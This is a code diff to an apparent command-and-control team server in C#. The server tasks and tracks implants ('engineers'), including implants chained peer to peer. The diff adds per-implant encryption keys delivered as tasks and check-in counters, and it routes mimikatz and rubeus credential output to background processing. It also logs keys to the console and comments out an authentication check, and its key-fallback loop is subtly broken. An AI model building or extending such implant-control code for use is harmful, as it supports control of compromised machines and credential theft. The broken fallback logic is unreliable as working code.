@@ -41,6 +41,7 @@ namespace TeamServer.Models
         public static Dictionary<string, EngineerTask> CommandIds = new Dictionary<string, EngineerTask>();
         public static Dictionary<string, List<string>> EngineerChildIds = new Dictionary<string, List<string>>(); //keys are Engineers that have child engineers they can task, value is the childrens ids  
         public static Dictionary<string, List<string>> PathStorage = new Dictionary<string, List<string>>(); // key is the Engineer Id, Value is a list of parent ids and ends with its own id, making its path. The path is a list element 0 is the http, and each new eleemnt is a layer deepr
+        public static Dictionary<string,int> EngineerCheckinCount = new Dictionary<string, int>(); //key is the engineer id, value is the number of times they have checked in
         public static IEnumerable<EngineerTaskResult> results { get; set;}
        
 
@@ -76,6 +77,7 @@ namespace TeamServer.Models
                 HttpContext.Response.Headers.Add($"{headerName}", $"{headerValue}");
             }
 
+            //only works on HTTP/HTTPS because the metadata for these calls comes from the headers.
             var engineer = _engineers.GetEngineer(engineermetadata.Id);
             if (engineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
             {
@@ -94,13 +96,35 @@ namespace TeamServer.Models
                 PathStorage.Add(engineer.engineerMetadata.Id, new List<string> { engineer.engineerMetadata.Id });
                 HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {engineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
                 LoggingService.EventLogger.ForContext("engineer Metadata",engineer.engineerMetadata,true).ForContext("connection Type", engineer.ConnectionType).Information($"engineer {engineer.engineerMetadata.ProcessId}@{engineer.engineerMetadata.Address} checked in for the first time");
+                
+                //create the unique encryption key for this implant
+                Encryption.GenerateUniqueKeys(engineer.engineerMetadata.Id);
+                EngineerTask updateTaskKey = new EngineerTask
+                {
+                    Command = "UpdateTaskKey",
+                    Id = Guid.NewGuid().ToString(),
+                    Arguments = new Dictionary<string, string> { { "TaskKey", Encryption.UniqueTaskEncryptionKey[engineer.engineerMetadata.Id] } },
+                    File = null,
+                    IsBlocking = false
+                };
+                engineer.QueueTask(updateTaskKey);
             }
 
             //checkin and get/post data to or from the engineer 
             //checkin updates some of the properties for the engineer
             engineer.CheckIn();
+            if (EngineerCheckinCount.ContainsKey(engineer.engineerMetadata.Id))
+            {
+                EngineerCheckinCount[engineer.engineerMetadata.Id] += 1;
+            }
+            else
+            {
+                EngineerCheckinCount.Add(engineer.engineerMetadata.Id, 1);
+            }
+
             try
             {
+                
                 if (HttpContext.Request.Method == "GET")
                 {
                     //this will happen every sleep cycle it triggers the hub to let the client know a engineer has checked back in  
@@ -121,7 +145,36 @@ namespace TeamServer.Models
                     await HttpContext.Request.Body.CopyToAsync(ms);
                     encryptedData = ms.ToArray();
                     // convert the EncryptedJson object to a byte array and decrypt it using the AES_Decrypt function
-                    var decryptedBytes = Encryption.AES_Decrypt(encryptedData,"PlaceTaskKeyhereLater");
+                    byte[] decryptedBytes;
+                    if (Encryption.UniqueTaskEncryptionKey.ContainsKey(engineer.engineerMetadata.Id))
+                    {
+                        Console.WriteLine($"Uaing unique key {Encryption.UniqueTaskEncryptionKey[engineer.engineerMetadata.Id]}");
+                        decryptedBytes = Encryption.AES_Decrypt(encryptedData,Encryption.UniqueTaskEncryptionKey[engineer.engineerMetadata.Id]);
+                    }
+                    else
+                    {
+                        Console.WriteLine($"using universal key {Encryption.UniversalTaskEncryptionKey}");
+                        decryptedBytes = Encryption.AES_Decrypt(encryptedData,Encryption.UniversalTaskEncryptionKey);
+                    }
+                    //if decryptedBytes is null then the decryption failed & we should try using the pathStorage dictionary to find the correct key
+                    if (decryptedBytes == null)
+                    {
+                        if (PathStorage.ContainsKey(engineer.engineerMetadata.Id))
+                        {
+                            foreach (string key in PathStorage[engineer.engineerMetadata.Id])
+                            {
+                                if (Encryption.UniqueTaskEncryptionKey.ContainsKey(key))
+                                {
+                                    decryptedBytes = Encryption.AES_Decrypt(encryptedData, Encryption.UniqueTaskEncryptionKey[key]);
+                                    if (decryptedBytes != null)
+                                    {
+                                        break;
+                                    }
+                                }
+                                decryptedBytes = Encryption.AES_Decrypt(encryptedData, Encryption.UniversalTaskEncryptionKey);
+                            }
+                        }
+                    }
 
                     results = decryptedBytes.ProDeserialize<IEnumerable<EngineerTaskResult>>(); //should hold the results of the Engineer response to a command
 
@@ -152,42 +205,78 @@ namespace TeamServer.Models
                             {
                                 await TaskPostProcess.PostPorcess_RPortForward(result);
                             }
+
                             //performs the first checkin for P2P implants to get the pathing info, metadata, and add the new engineer to the needed lists. 
                             else if (result.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                             {
-                                Console.WriteLine("P2PFirstTimeCheckIn time");
                                 string p2pEngMetadataString = await TaskPostProcess.PostProcess_P2PFirstCheckIn(result, engineer);
                                 byte[] p2pMetaDataByte = Convert.FromBase64String(p2pEngMetadataString);
-                                EngineerMetadata pepEngMetadata = p2pMetaDataByte.ProDeserialize<EngineerMetadata>();
-                                var p2pengineer = _engineers.GetEngineer(pepEngMetadata.Id);
+                                EngineerMetadata p2pEngMetadata = p2pMetaDataByte.ProDeserialize<EngineerMetadata>();
+                                var p2pengineer = _engineers.GetEngineer(p2pEngMetadata.Id);
                                 if (p2pengineer is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
                                 {
                                     // use the parent id to get the parents pid@address 
-                                    var parentEngineer = _engineers.GetEngineer(PathStorage[pepEngMetadata.Id][0]);
+                                    var parentEngineer = _engineers.GetEngineer(PathStorage[p2pEngMetadata.Id][0]);
                                     var extralAddressP2PString = parentEngineer.engineerMetadata.ProcessId + "@" + parentEngineer.engineerMetadata.Address;
 
-                                    p2pengineer = new Engineer(pepEngMetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
+                                    p2pengineer = new Engineer(p2pEngMetadata)                // makes object of Engineer type, and passes in the incoming metadata for the first time 
                                     {
                                         ExternalAddress = extralAddressP2PString,
-                                        ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == pepEngMetadata.ManagerName).Type.ToString(),
-                                    };
+                                        ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == p2pEngMetadata.ManagerName).Type.ToString(),
+                                    }; 
+                                    if (DatabaseService.Connection == null)
+                                    {
+                                        DatabaseService.ConnectDb();
+                                    }
+                                    DatabaseService.Connection.Insert((Engineer_DAO)p2pengineer);
                                     _engineers.AddEngineer(p2pengineer);                    // uses service too add Engineer to list
-                                    HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {p2pengineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
-                                    LoggingService.EventLogger.Information("P2P engineer {@p2pengineer} checked in for the first time", p2pengineer);
+                                     HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"engineer {p2pengineer.engineerMetadata.Id} checked in for the first time", Status = "Success" });
+                                     LoggingService.EventLogger.ForContext("engineer Metadata",p2pengineer.engineerMetadata,true).ForContext("connection Type", p2pengineer.ConnectionType).Information($"engineer {p2pengineer.engineerMetadata.ProcessId}@{p2pengineer.engineerMetadata.Address} checked in for the first time");
+                
+                                     //create the unique encryption key for this implant
+                                     Encryption.GenerateUniqueKeys(p2pengineer.engineerMetadata.Id);
+                                     EngineerTask updateTaskKey = new EngineerTask
+                                     {
+                                         Command = "UpdateTaskKey",
+                                         Id = Guid.NewGuid().ToString(),
+                                         Arguments = new Dictionary<string, string> { { "TaskKey", Encryption.UniqueTaskEncryptionKey[p2pengineer.engineerMetadata.Id] } },
+                                         File = null,
+                                         IsBlocking = false
+                                     };
+                                     p2pengineer.QueueTask(updateTaskKey);
                                 }
                                 //checkin and get/post data to or from the engineer 
                                 p2pengineer.CheckIn();
+                                if (EngineerCheckinCount.ContainsKey(p2pengineer.engineerMetadata.Id))
+                                {
+                                    EngineerCheckinCount[p2pengineer.engineerMetadata.Id] += 1;
+                                }
+                                else
+                                {
+                                    EngineerCheckinCount.Add(p2pengineer.engineerMetadata.Id, 1);
+                                }
+                                
                             }
                             //allows for other engineers besides http to have a "check-in"
                             else if (result.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
                             {
-                                var eng = _engineers.GetEngineer(result.EngineerId);
-                                eng.CheckIn();
+                                var p2pengineer = _engineers.GetEngineer(result.EngineerId);
+                                //checkin and get/post data to or from the engineer 
+                                p2pengineer.CheckIn();
+                                if (EngineerCheckinCount.ContainsKey(p2pengineer.engineerMetadata.Id))
+                                {
+                                    EngineerCheckinCount[p2pengineer.engineerMetadata.Id] += 1;
+                                }
+                                else
+                                {
+                                    EngineerCheckinCount.Add(p2pengineer.engineerMetadata.Id, 1);
+                                }
                             }
+                            
                             //these 2 command types can be processed by the cred check
                             else if (result.Result.Contains("mimikatz") || result.Result.Contains("rubeus"))
                             {
-                                await TaskPostProcess.PostProcess_CredTask(result);
+                               Task.Run(async() => await TaskPostProcess.PostProcess_CredTask(result));
                             }
                         }
                         if (result.IsHidden)
@@ -201,6 +290,8 @@ namespace TeamServer.Models
                         if(result.IsHidden == false)
                         {
                             DatabaseService.Connection.Insert((EngineerTaskResult_DAO)result);
+                            HardHatHub.AlertEventHistory(new HistoryEvent() { Event = $"Got response for task {result.Id}", Status="Success" });
+                            LoggingService.TaskLogger.ForContext("Task Result",result,true).Information($"Got response for task {result.Id}");
                         }
                     }
                     foreach(string engId in engIds)
@@ -244,7 +335,8 @@ namespace TeamServer.Models
                     {
                         PathStorage.Add(eng.engineerMetadata.Id, new List<string>() { eng.engineerMetadata.Id });
                     }
-                    if (PathStorage[eng.engineerMetadata.Id].Contains(engineer.engineerMetadata.Id)) // checking if the current Http implant is in its path, if it is then we know eng is a child of this http implant in some way and can be tasked by it.
+                    // checking if the current Http implant is in its path, if it is then we know eng is a child of this http implant in some way and can be tasked by it.
+                    if (PathStorage[eng.engineerMetadata.Id].Contains(engineer.engineerMetadata.Id))
                     {
                         if(eng._pendingTasks.Count() >0) // eng has a task to be sent
                         {
@@ -259,14 +351,25 @@ namespace TeamServer.Models
                                     {
                                         CommandIds.Add(task.Id, task);
                                     }
-                                    if (TaskPreProcess.CommandsThatNeedPreProc.Contains(task.Command))
+                                    if (TaskPreProcess.CommandsThatNeedPreProc.Contains(task.Command, StringComparer.OrdinalIgnoreCase))
                                     {
                                         await TaskPreProcess.PreProcessTask(task, eng);
                                     }
                                     HardHatHub.AddTaskIdToPickedUpList(task.Id);
                                 }
                                 var taskArray = engTasks.ProSerialise();
-                                var encryptedTaskArray = Encryption.AES_Encrypt(taskArray,"PlaceTaskKeyHereLater");
+                                byte[] encryptedTaskArray;
+                                if (EngineerCheckinCount[eng.engineerMetadata.Id] > 1)
+                                {
+                                    Console.WriteLine($"Using unique encryption key {Encryption.UniqueTaskEncryptionKey[eng.engineerMetadata.Id]}");
+                                    encryptedTaskArray = Encryption.AES_Encrypt(taskArray,Encryption.UniqueTaskEncryptionKey[eng.engineerMetadata.Id]);
+                                }
+                                else
+                                {
+                                    Console.WriteLine($"Using encryption key {Encryption.UniversalTaskEncryptionKey}");
+                                    encryptedTaskArray = Encryption.AES_Encrypt(taskArray,Encryption.UniversalTaskEncryptionKey);
+                                }
+
                                 var c2TaskMessage = new C2TaskMessage { TaskData = encryptedTaskArray, PathMessage = PathStorage[eng.engineerMetadata.Id] };
                                 //do a console.WriteLine where the message each element in c2TaskMessage.PathMessage
                                 //Console.WriteLine($"path is {String.Join("->",c2TaskMessage.PathMessage)}");
@@ -307,14 +410,14 @@ namespace TeamServer.Models
         {
             try
             {
-                if (!headers.TryGetValue("Authentication", out var encryptedImplantId))
-                {
-                    return null;
-                }
-                var decryptedImplantIdByte = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedImplantId), Encryption.UniversialMetadataIdKey);
-                //undo the utf-8 encoding to get back the string 
-                var decryptedImplantId = Encoding.UTF8.GetString(decryptedImplantIdByte);
-               // Console.WriteLine($"implant id is {decryptedImplantId}");
+               //  if (!headers.TryGetValue("Authentication", out var encryptedImplantId))
+               //  {
+               //      return null;
+               //  }
+               //  var decryptedImplantIdByte = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedImplantId), Encryption.UniversialMetadataKey);
+               //  //undo the utf-8 encoding to get back the string 
+               //  var decryptedImplantId = Encoding.UTF8.GetString(decryptedImplantIdByte);
+               // // Console.WriteLine($"implant id is {decryptedImplantId}");
 
                 if (!headers.TryGetValue("Authorization", out var encryptedencodedMetadata))     //extracted as base64 due too TryGetValue
                 {
@@ -324,7 +427,7 @@ namespace TeamServer.Models
                // Console.WriteLine($"metadata encryption key is {Encryption.UniqueMetadataKey[decryptedImplantId]}");
                 encryptedencodedMetadata = encryptedencodedMetadata.ToString().Remove(0, 7);           // cleans up the from out the `Authorization: Bearer METADATAHERE`  response 
                                                                                                        // DeEncrypt the metadata using the Encryption.AES_Decrypt function
-                byte[] encodedMetadataArray = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedencodedMetadata), "dummyText");
+                byte[] encodedMetadataArray = Encryption.AES_Decrypt(Convert.FromBase64String(encryptedencodedMetadata), Encryption.UniversialMetadataKey);
                 return encodedMetadataArray.ProDeserialize<EngineerMetadata>(); // deserialise the metadata
             }
             catch (Exception ex)
